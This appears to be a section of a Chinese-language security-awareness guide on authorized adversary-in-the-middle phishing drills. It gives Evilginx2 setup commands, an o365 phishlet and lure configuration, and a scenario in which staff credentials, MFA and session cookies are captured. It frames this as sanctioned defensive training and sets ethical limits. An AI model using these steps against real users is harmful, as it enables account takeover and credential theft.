## 四、高级钓鱼演练：全链路仿真（AiTM/Evilginx2）

### 4.1 为什么需要高级仿真

传统演练用静态伪造页面，员工"提交的密码"根本不被收集；而真实攻击者已全面转向**中间人攻击（AiTM）**——实时代理真实登录页、中继MFA挑战、窃取会话Cookie直接接管账号（MFA也无法阻挡）。传统演练无法训练员工对抗此类攻击，高级仿真应运而生：**用与真实攻击相同的攻击面检验防御与员工行为，但严格在授权沙箱内运行**。

### 4.2 Evilginx2部署（授权演练环境）

```bash
# Kali/Ubuntu VPS（演练专用域名+公网IP）
# 1. 克隆编译
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# 2. 运行（需root监听80/443）
sudo ./bin/evilginx

# 3. 配置域名与phishlet（evilginx2 CLI）
config domain victim-test.example.com        # 演练专用域名
phishlets hostname o365 victim-test.example.com
phishlets enable o365
lures create o365
lures get-url 0                              # 生成钓鱼链接
```
**前提**：自有演练域名 + DNS解析指向VPS + Let's Encrypt自动签证书（首次访问页面需通过）。Evilginx2以反向代理身份实时转发真实登录页（如login.microsoftonline.com），员工在演练中输入的密码/MFA被代理到真实服务完成认证，随后Cookie被捕获——**演练平台可在授权下仅记录"是否成功认证"而不保存敏感值**。

### 4.3 phishlet与lure配置要点

```
- phishlet: YAML文件定义代理规则（路径映射/JS替换/凭据与Cookie提取规则）
- 内置常用phishlet: o365/google/okta/facebook等
- lure: 具体钓鱼URL，可携带redirect参数（认证后跳转到哪）
- 自定义phishlet: 适配内部SSO系统（开发成本高，需评估）
- 可靠性验证: 演练前用测试账号完整走通登录+多因子流程
```

### 4.4 场景化演练设计（MFA钓鱼全链路）

```
场景：MFA会话劫持演练
目标：检验员工对"二次认证请求"的敏感度 + 验证组织Conditional Access策略
流程：
1. 向目标部门发送伪造"安全邮件：请重新验证以继续访问邮箱"
2. 邮件链接指向Evilginx2代理的真实登录页
3. 员工输入密码+完成MFA → 代理实时转发 → 演练平台记录"会话成功被捕获"
4. 员工被引导至教育页面："您刚刚的密码与MFA令牌已被模拟攻击者截获"
5. 安全团队演示：用捕获的Cookie登录 → 展示MFA为何失效 → 讲解Passkey/FIDO2价值
数据输出：中招率、各部门分布、MFA验证习惯、条件访问策略缺陷
```

### 4.5 安全边界与伦理红线（高级演练必守）

```
- 仅限授权：高级演练模拟的是真实攻击能力，必须管理层书面授权+限定演练账号/域名
- 隔离环境：演练域名与真实业务完全隔离，禁用水坑/持久化/真实数据导出
- 凭据保护：演练系统禁止明文存储任何输入，捕获的Cookie演练后立即销毁
- 白名单：提前通知SOC/蓝队演练时间窗（或作为隐蔽演练由SOC自行发现，需事先约定）
- 即时恢复：演练结束立即下线域名/撤销证书，防止被第三方滥用
- 与供应商联动：涉及SaaS（M365等）的演练，需与云厂商合规条款核对（第三方钓鱼测试政策）
- 应急预案：演练中出现真实攻击混淆时，有明确叫停机制
```

